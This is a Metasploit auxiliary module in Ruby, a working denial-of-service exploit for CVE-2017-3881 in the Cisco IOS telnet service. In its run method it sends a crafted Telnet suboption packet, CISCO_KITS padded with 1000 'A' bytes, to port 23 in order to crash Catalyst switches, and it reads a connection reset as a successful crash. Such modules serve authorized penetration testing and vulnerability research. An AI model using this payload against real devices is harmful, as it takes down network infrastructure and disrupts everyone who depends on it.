##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Cisco IOS Telnet Denial of Service',
      'Description'    => %q{
        This module triggers a Denial of Service condition in the Cisco IOS
        telnet service affecting multiple Cisco switches (https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170317-cmp). Tested against Cisco Catalyst 2960.
      },
      'Author'      => [ 'Artem Kondratenko' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'BID', '96960'],
          [ 'CVE', 'CVE-2017-3881'],
        ],
      'DisclosureDate' => 'March 17 2017'))

    register_options(
      [
        Opt::RPORT(23),
      ], self.class)

  end

  def run

    connect
    print_status("Connected to telnet service")
    print_status("Got initial packet from telnet service: " + sock.gets.inspect)
    print_status("Sending Telnet DoS packet")
    sock.put("\xff\xfa\x24\x00\x03CISCO_KITS\x012:" + 'A' * 1000 + ":1:\xff\xf0") 
    disconnect

    rescue ::Rex::ConnectionRefused
      print_status("Unable to connect to #{rhost}:#{rport}.")
    rescue ::Errno::ECONNRESET
      print_status("DoS packet successful. #{rhost} not responding.")
  end

end

